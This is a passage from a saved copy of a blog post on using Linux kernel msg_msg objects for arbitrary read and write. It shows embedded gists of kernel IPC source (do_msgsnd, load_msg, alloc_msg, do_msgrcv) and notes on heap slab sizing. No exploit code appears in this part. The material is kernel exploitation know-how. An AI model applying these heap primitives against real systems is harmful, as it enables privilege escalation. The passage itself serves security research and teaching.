          <td id="file-do_msgsnd-c-LC103" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L104" class="blob-num js-line-number js-code-nav-line-number" data-line-number="104"></td>
          <td id="file-do_msgsnd-c-LC104" class="blob-code blob-code-inner js-file-line">out_unlock0:</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L105" class="blob-num js-line-number js-code-nav-line-number" data-line-number="105"></td>
          <td id="file-do_msgsnd-c-LC105" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">ipc_unlock_object</span>(&amp;msq-&gt;<span class="pl-smi">q_perm</span>);</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L106" class="blob-num js-line-number js-code-nav-line-number" data-line-number="106"></td>
          <td id="file-do_msgsnd-c-LC106" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">wake_up_q</span>(&amp;wake_q);</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L107" class="blob-num js-line-number js-code-nav-line-number" data-line-number="107"></td>
          <td id="file-do_msgsnd-c-LC107" class="blob-code blob-code-inner js-file-line">out_unlock1:</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L108" class="blob-num js-line-number js-code-nav-line-number" data-line-number="108"></td>
          <td id="file-do_msgsnd-c-LC108" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">rcu_read_unlock</span>();</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L109" class="blob-num js-line-number js-code-nav-line-number" data-line-number="109"></td>
          <td id="file-do_msgsnd-c-LC109" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (msg != <span class="pl-c1">NULL</span>)</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L110" class="blob-num js-line-number js-code-nav-line-number" data-line-number="110"></td>
          <td id="file-do_msgsnd-c-LC110" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">free_msg</span>(msg);</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L111" class="blob-num js-line-number js-code-nav-line-number" data-line-number="111"></td>
          <td id="file-do_msgsnd-c-LC111" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> err;</td>
        </tr>
        <tr>
          <td id="file-do_msgsnd-c-L112" class="blob-num js-line-number js-code-nav-line-number" data-line-number="112"></td>
          <td id="file-do_msgsnd-c-LC112" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


  </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/BitsByWill/cf23c13d4a1d345b557a157740e191fe/raw/22c9c8f0ec44a889d72d7a62674449085cfacdf6/do_msgsnd.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/BitsByWill/cf23c13d4a1d345b557a157740e191fe#file-do_msgsnd-c">
          do_msgsnd.c
        </a>
        hosted with ❤ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div><div><br></div><div>Before enqueing this msg onto the specified message queue, <a href="https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L84">load_msg</a> is called to usercopy data into the chunk.</div><div><br></div><div><script src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/cf23c13d4a1d345b557a157740e191fe.js(3).下載"></script><link rel="stylesheet" href="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/gist-embed-ff75a167df5efbfedb0e388793ca9fe7.css"><div id="gist111465757" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-load_msg-c" class="file my-2">
    
  <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

      
<div class="js-check-bidi blob-code-content">
  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="load_msg.c">
        <tbody><tr>
          <td id="file-load_msg-c-L1" class="blob-num js-line-number js-code-nav-line-number" data-line-number="1"></td>
          <td id="file-load_msg-c-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-k">struct</span> msg_msg *<span class="pl-en">load_msg</span>(<span class="pl-k">const</span> <span class="pl-k">void</span> __user *src, <span class="pl-c1">size_t</span> len)</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L2" class="blob-num js-line-number js-code-nav-line-number" data-line-number="2"></td>
          <td id="file-load_msg-c-LC2" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L3" class="blob-num js-line-number js-code-nav-line-number" data-line-number="3"></td>
          <td id="file-load_msg-c-LC3" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> msg_msg *msg;</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L4" class="blob-num js-line-number js-code-nav-line-number" data-line-number="4"></td>
          <td id="file-load_msg-c-LC4" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> msg_msgseg *seg;</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L5" class="blob-num js-line-number js-code-nav-line-number" data-line-number="5"></td>
          <td id="file-load_msg-c-LC5" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> err = -EFAULT;</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L6" class="blob-num js-line-number js-code-nav-line-number" data-line-number="6"></td>
          <td id="file-load_msg-c-LC6" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">size_t</span> alen;</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L7" class="blob-num js-line-number js-code-nav-line-number" data-line-number="7"></td>
          <td id="file-load_msg-c-LC7" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L8" class="blob-num js-line-number js-code-nav-line-number" data-line-number="8"></td>
          <td id="file-load_msg-c-LC8" class="blob-code blob-code-inner js-file-line">    msg = <span class="pl-c1">alloc_msg</span>(len);</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L9" class="blob-num js-line-number js-code-nav-line-number" data-line-number="9"></td>
          <td id="file-load_msg-c-LC9" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (msg == <span class="pl-c1">NULL</span>)</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L10" class="blob-num js-line-number js-code-nav-line-number" data-line-number="10"></td>
          <td id="file-load_msg-c-LC10" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> <span class="pl-c1">ERR_PTR</span>(-ENOMEM);</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L11" class="blob-num js-line-number js-code-nav-line-number" data-line-number="11"></td>
          <td id="file-load_msg-c-LC11" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L12" class="blob-num js-line-number js-code-nav-line-number" data-line-number="12"></td>
          <td id="file-load_msg-c-LC12" class="blob-code blob-code-inner js-file-line">    alen = <span class="pl-c1">min</span>(len, DATALEN_MSG);</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L13" class="blob-num js-line-number js-code-nav-line-number" data-line-number="13"></td>
          <td id="file-load_msg-c-LC13" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">copy_from_user</span>(msg + <span class="pl-c1">1</span>, src, alen))</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L14" class="blob-num js-line-number js-code-nav-line-number" data-line-number="14"></td>
          <td id="file-load_msg-c-LC14" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">goto</span> out_err;</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L15" class="blob-num js-line-number js-code-nav-line-number" data-line-number="15"></td>
          <td id="file-load_msg-c-LC15" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L16" class="blob-num js-line-number js-code-nav-line-number" data-line-number="16"></td>
          <td id="file-load_msg-c-LC16" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (seg = msg-&gt;<span class="pl-smi">next</span>; seg != <span class="pl-c1">NULL</span>; seg = seg-&gt;<span class="pl-smi">next</span>) {</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L17" class="blob-num js-line-number js-code-nav-line-number" data-line-number="17"></td>
          <td id="file-load_msg-c-LC17" class="blob-code blob-code-inner js-file-line">        len -= alen;</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L18" class="blob-num js-line-number js-code-nav-line-number" data-line-number="18"></td>
          <td id="file-load_msg-c-LC18" class="blob-code blob-code-inner js-file-line">        src = (<span class="pl-k">char</span> __user *)src + alen;</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L19" class="blob-num js-line-number js-code-nav-line-number" data-line-number="19"></td>
          <td id="file-load_msg-c-LC19" class="blob-code blob-code-inner js-file-line">        alen = <span class="pl-c1">min</span>(len, DATALEN_SEG);</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L20" class="blob-num js-line-number js-code-nav-line-number" data-line-number="20"></td>
          <td id="file-load_msg-c-LC20" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-c1">copy_from_user</span>(seg + <span class="pl-c1">1</span>, src, alen))</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L21" class="blob-num js-line-number js-code-nav-line-number" data-line-number="21"></td>
          <td id="file-load_msg-c-LC21" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">goto</span> out_err;</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L22" class="blob-num js-line-number js-code-nav-line-number" data-line-number="22"></td>
          <td id="file-load_msg-c-LC22" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L23" class="blob-num js-line-number js-code-nav-line-number" data-line-number="23"></td>
          <td id="file-load_msg-c-LC23" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L24" class="blob-num js-line-number js-code-nav-line-number" data-line-number="24"></td>
          <td id="file-load_msg-c-LC24" class="blob-code blob-code-inner js-file-line">    err = <span class="pl-c1">security_msg_msg_alloc</span>(msg);</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L25" class="blob-num js-line-number js-code-nav-line-number" data-line-number="25"></td>
          <td id="file-load_msg-c-LC25" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (err)</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L26" class="blob-num js-line-number js-code-nav-line-number" data-line-number="26"></td>
          <td id="file-load_msg-c-LC26" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">goto</span> out_err;</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L27" class="blob-num js-line-number js-code-nav-line-number" data-line-number="27"></td>
          <td id="file-load_msg-c-LC27" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L28" class="blob-num js-line-number js-code-nav-line-number" data-line-number="28"></td>
          <td id="file-load_msg-c-LC28" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> msg;</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L29" class="blob-num js-line-number js-code-nav-line-number" data-line-number="29"></td>
          <td id="file-load_msg-c-LC29" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L30" class="blob-num js-line-number js-code-nav-line-number" data-line-number="30"></td>
          <td id="file-load_msg-c-LC30" class="blob-code blob-code-inner js-file-line">out_err:</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L31" class="blob-num js-line-number js-code-nav-line-number" data-line-number="31"></td>
          <td id="file-load_msg-c-LC31" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">free_msg</span>(msg);</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L32" class="blob-num js-line-number js-code-nav-line-number" data-line-number="32"></td>
          <td id="file-load_msg-c-LC32" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">ERR_PTR</span>(err);</td>
        </tr>
        <tr>
          <td id="file-load_msg-c-L33" class="blob-num js-line-number js-code-nav-line-number" data-line-number="33"></td>
          <td id="file-load_msg-c-LC33" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


  </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/BitsByWill/cf23c13d4a1d345b557a157740e191fe/raw/22c9c8f0ec44a889d72d7a62674449085cfacdf6/load_msg.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/BitsByWill/cf23c13d4a1d345b557a157740e191fe#file-load_msg-c">
          load_msg.c
        </a>
        hosted with ❤ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div><div><br></div><div>Note how it calls <a href="https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L46">alloc_msg</a> to allocate space on the kernel heap for the incoming message beforehand.</div><div><br></div><div><script src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/cf23c13d4a1d345b557a157740e191fe.js(4).下載"></script><link rel="stylesheet" href="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/gist-embed-ff75a167df5efbfedb0e388793ca9fe7.css"><div id="gist111465757" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-alloc_msg-c" class="file my-2">
    
  <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

      
<div class="js-check-bidi blob-code-content">
  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="alloc_msg.c">
        <tbody><tr>
          <td id="file-alloc_msg-c-L1" class="blob-num js-line-number js-code-nav-line-number" data-line-number="1"></td>
          <td id="file-alloc_msg-c-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">struct</span> msg_msg *<span class="pl-en">alloc_msg</span>(<span class="pl-c1">size_t</span> len)</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L2" class="blob-num js-line-number js-code-nav-line-number" data-line-number="2"></td>
          <td id="file-alloc_msg-c-LC2" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L3" class="blob-num js-line-number js-code-nav-line-number" data-line-number="3"></td>
          <td id="file-alloc_msg-c-LC3" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> msg_msg *msg;</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L4" class="blob-num js-line-number js-code-nav-line-number" data-line-number="4"></td>
          <td id="file-alloc_msg-c-LC4" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> msg_msgseg **pseg;</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L5" class="blob-num js-line-number js-code-nav-line-number" data-line-number="5"></td>
          <td id="file-alloc_msg-c-LC5" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">size_t</span> alen;</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L6" class="blob-num js-line-number js-code-nav-line-number" data-line-number="6"></td>
          <td id="file-alloc_msg-c-LC6" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L7" class="blob-num js-line-number js-code-nav-line-number" data-line-number="7"></td>
          <td id="file-alloc_msg-c-LC7" class="blob-code blob-code-inner js-file-line">    alen = <span class="pl-c1">min</span>(len, DATALEN_MSG);</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L8" class="blob-num js-line-number js-code-nav-line-number" data-line-number="8"></td>
          <td id="file-alloc_msg-c-LC8" class="blob-code blob-code-inner js-file-line">    msg = <span class="pl-c1">kmalloc</span>(<span class="pl-k">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L9" class="blob-num js-line-number js-code-nav-line-number" data-line-number="9"></td>
          <td id="file-alloc_msg-c-LC9" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (msg == <span class="pl-c1">NULL</span>)</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L10" class="blob-num js-line-number js-code-nav-line-number" data-line-number="10"></td>
          <td id="file-alloc_msg-c-LC10" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L11" class="blob-num js-line-number js-code-nav-line-number" data-line-number="11"></td>
          <td id="file-alloc_msg-c-LC11" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L12" class="blob-num js-line-number js-code-nav-line-number" data-line-number="12"></td>
          <td id="file-alloc_msg-c-LC12" class="blob-code blob-code-inner js-file-line">    msg-&gt;<span class="pl-smi">next</span> = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L13" class="blob-num js-line-number js-code-nav-line-number" data-line-number="13"></td>
          <td id="file-alloc_msg-c-LC13" class="blob-code blob-code-inner js-file-line">    msg-&gt;<span class="pl-smi">security</span> = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L14" class="blob-num js-line-number js-code-nav-line-number" data-line-number="14"></td>
          <td id="file-alloc_msg-c-LC14" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L15" class="blob-num js-line-number js-code-nav-line-number" data-line-number="15"></td>
          <td id="file-alloc_msg-c-LC15" class="blob-code blob-code-inner js-file-line">    len -= alen;</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L16" class="blob-num js-line-number js-code-nav-line-number" data-line-number="16"></td>
          <td id="file-alloc_msg-c-LC16" class="blob-code blob-code-inner js-file-line">    pseg = &amp;msg-&gt;<span class="pl-smi">next</span>;</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L17" class="blob-num js-line-number js-code-nav-line-number" data-line-number="17"></td>
          <td id="file-alloc_msg-c-LC17" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">while</span> (len &gt; <span class="pl-c1">0</span>) {</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L18" class="blob-num js-line-number js-code-nav-line-number" data-line-number="18"></td>
          <td id="file-alloc_msg-c-LC18" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">struct</span> msg_msgseg *seg;</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L19" class="blob-num js-line-number js-code-nav-line-number" data-line-number="19"></td>
          <td id="file-alloc_msg-c-LC19" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L20" class="blob-num js-line-number js-code-nav-line-number" data-line-number="20"></td>
          <td id="file-alloc_msg-c-LC20" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">cond_resched</span>();</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L21" class="blob-num js-line-number js-code-nav-line-number" data-line-number="21"></td>
          <td id="file-alloc_msg-c-LC21" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L22" class="blob-num js-line-number js-code-nav-line-number" data-line-number="22"></td>
          <td id="file-alloc_msg-c-LC22" class="blob-code blob-code-inner js-file-line">        alen = <span class="pl-c1">min</span>(len, DATALEN_SEG);</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L23" class="blob-num js-line-number js-code-nav-line-number" data-line-number="23"></td>
          <td id="file-alloc_msg-c-LC23" class="blob-code blob-code-inner js-file-line">        seg = <span class="pl-c1">kmalloc</span>(<span class="pl-k">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L24" class="blob-num js-line-number js-code-nav-line-number" data-line-number="24"></td>
          <td id="file-alloc_msg-c-LC24" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (seg == <span class="pl-c1">NULL</span>)</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L25" class="blob-num js-line-number js-code-nav-line-number" data-line-number="25"></td>
          <td id="file-alloc_msg-c-LC25" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">goto</span> out_err;</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L26" class="blob-num js-line-number js-code-nav-line-number" data-line-number="26"></td>
          <td id="file-alloc_msg-c-LC26" class="blob-code blob-code-inner js-file-line">        *pseg = seg;</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L27" class="blob-num js-line-number js-code-nav-line-number" data-line-number="27"></td>
          <td id="file-alloc_msg-c-LC27" class="blob-code blob-code-inner js-file-line">        seg-&gt;<span class="pl-smi">next</span> = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L28" class="blob-num js-line-number js-code-nav-line-number" data-line-number="28"></td>
          <td id="file-alloc_msg-c-LC28" class="blob-code blob-code-inner js-file-line">        pseg = &amp;seg-&gt;<span class="pl-smi">next</span>;</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L29" class="blob-num js-line-number js-code-nav-line-number" data-line-number="29"></td>
          <td id="file-alloc_msg-c-LC29" class="blob-code blob-code-inner js-file-line">        len -= alen;</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L30" class="blob-num js-line-number js-code-nav-line-number" data-line-number="30"></td>
          <td id="file-alloc_msg-c-LC30" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L31" class="blob-num js-line-number js-code-nav-line-number" data-line-number="31"></td>
          <td id="file-alloc_msg-c-LC31" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L32" class="blob-num js-line-number js-code-nav-line-number" data-line-number="32"></td>
          <td id="file-alloc_msg-c-LC32" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> msg;</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L33" class="blob-num js-line-number js-code-nav-line-number" data-line-number="33"></td>
          <td id="file-alloc_msg-c-LC33" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L34" class="blob-num js-line-number js-code-nav-line-number" data-line-number="34"></td>
          <td id="file-alloc_msg-c-LC34" class="blob-code blob-code-inner js-file-line">out_err:</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L35" class="blob-num js-line-number js-code-nav-line-number" data-line-number="35"></td>
          <td id="file-alloc_msg-c-LC35" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">free_msg</span>(msg);</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L36" class="blob-num js-line-number js-code-nav-line-number" data-line-number="36"></td>
          <td id="file-alloc_msg-c-LC36" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-alloc_msg-c-L37" class="blob-num js-line-number js-code-nav-line-number" data-line-number="37"></td>
          <td id="file-alloc_msg-c-LC37" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


  </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/BitsByWill/cf23c13d4a1d345b557a157740e191fe/raw/22c9c8f0ec44a889d72d7a62674449085cfacdf6/alloc_msg.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/BitsByWill/cf23c13d4a1d345b557a157740e191fe#file-alloc_msg-c">
          alloc_msg.c
        </a>
        hosted with ❤ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div><div><br></div><div>msg_msgseg is simply a struct that has a next pointer with data following immediately afterwards. Both DATALEN_MSG and DATALEN_SEG are basically page size minus the size of their respective structs, so their maximum size fits exactly in the kmalloc 4k slabs. Once you send in larger messages, a linked list is created. The maximum size of a message is determined by /proc/sys/kernel/msgmax, and its default is 8192 bytes (so you can get a linked list of 3 elements at most). <br><br>Now, let's take a look at <a href="https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1090">do_msgrcv</a>:<script src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/cf23c13d4a1d345b557a157740e191fe.js(5).下載"></script><link rel="stylesheet" href="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/gist-embed-ff75a167df5efbfedb0e388793ca9fe7.css"><div id="gist111465757" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-do_msgrcv-c" class="file my-2">
    
  <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

      
<div class="js-check-bidi blob-code-content">
  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="do_msgrcv.c">
        <tbody><tr>
          <td id="file-do_msgrcv-c-L1" class="blob-num js-line-number js-code-nav-line-number" data-line-number="1"></td>
          <td id="file-do_msgrcv-c-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-k">static</span> <span class="pl-k">long</span> <span class="pl-en">do_msgrcv</span>(<span class="pl-k">int</span> msqid, <span class="pl-k">void</span> __user *buf, <span class="pl-c1">size_t</span> bufsz, <span class="pl-k">long</span> msgtyp, <span class="pl-k">int</span> msgflg,</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L2" class="blob-num js-line-number js-code-nav-line-number" data-line-number="2"></td>
          <td id="file-do_msgrcv-c-LC2" class="blob-code blob-code-inner js-file-line">           <span class="pl-en">long</span> (*msg_handler)(<span class="pl-k">void</span> __user *, <span class="pl-k">struct</span> msg_msg *, <span class="pl-c1">size_t</span>))</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L3" class="blob-num js-line-number js-code-nav-line-number" data-line-number="3"></td>
          <td id="file-do_msgrcv-c-LC3" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L4" class="blob-num js-line-number js-code-nav-line-number" data-line-number="4"></td>
          <td id="file-do_msgrcv-c-LC4" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> mode;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L5" class="blob-num js-line-number js-code-nav-line-number" data-line-number="5"></td>
          <td id="file-do_msgrcv-c-LC5" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> msg_queue *msq;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L6" class="blob-num js-line-number js-code-nav-line-number" data-line-number="6"></td>
          <td id="file-do_msgrcv-c-LC6" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> ipc_namespace *ns;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L7" class="blob-num js-line-number js-code-nav-line-number" data-line-number="7"></td>
          <td id="file-do_msgrcv-c-LC7" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> msg_msg *msg, *copy = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L8" class="blob-num js-line-number js-code-nav-line-number" data-line-number="8"></td>
          <td id="file-do_msgrcv-c-LC8" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">DEFINE_WAKE_Q</span>(wake_q);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L9" class="blob-num js-line-number js-code-nav-line-number" data-line-number="9"></td>
          <td id="file-do_msgrcv-c-LC9" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L10" class="blob-num js-line-number js-code-nav-line-number" data-line-number="10"></td>
          <td id="file-do_msgrcv-c-LC10" class="blob-code blob-code-inner js-file-line">    ns = current-&gt;<span class="pl-smi">nsproxy</span>-&gt;<span class="pl-smi">ipc_ns</span>;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L11" class="blob-num js-line-number js-code-nav-line-number" data-line-number="11"></td>
          <td id="file-do_msgrcv-c-LC11" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L12" class="blob-num js-line-number js-code-nav-line-number" data-line-number="12"></td>
          <td id="file-do_msgrcv-c-LC12" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (msqid &lt; <span class="pl-c1">0</span> || (<span class="pl-k">long</span>) bufsz &lt; <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L13" class="blob-num js-line-number js-code-nav-line-number" data-line-number="13"></td>
          <td id="file-do_msgrcv-c-LC13" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> -EINVAL;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L14" class="blob-num js-line-number js-code-nav-line-number" data-line-number="14"></td>
          <td id="file-do_msgrcv-c-LC14" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L15" class="blob-num js-line-number js-code-nav-line-number" data-line-number="15"></td>
